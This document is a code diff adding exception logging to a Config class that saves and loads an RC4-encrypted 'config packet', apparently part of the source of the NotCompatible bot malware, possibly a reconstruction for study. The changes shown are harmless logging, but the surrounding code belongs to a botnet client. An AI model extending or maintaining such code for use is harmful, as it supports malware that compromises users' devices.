@@ -7,11 +7,14 @@ import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
+import java.util.logging.Logger;
 
 import diff.notcompatible.c.bot.crypto.RC4;
 
 // "Config packet"
 public class Config {
+
+    private final static Logger LOGGER = Logger.getLogger("session");
 
     public Packet packet;
     public File directory;
@@ -34,6 +37,7 @@ public class Config {
             file.flush();
             file.close();
         } catch (Exception exception) {
+            LOGGER.throwing(exception.getClass().getName(), "save()", exception);
             exception.printStackTrace();
         }
     }
@@ -106,8 +110,9 @@ public class Config {
             if (isChanged) {
                 save(new File(directory.getPath()));
             }
-        } catch (IOException e) {
-            e.printStackTrace();
+        } catch (IOException exception) {
+            LOGGER.throwing(exception.getClass().getName(), "load()", exception);
+            exception.printStackTrace();
         }
     }
 
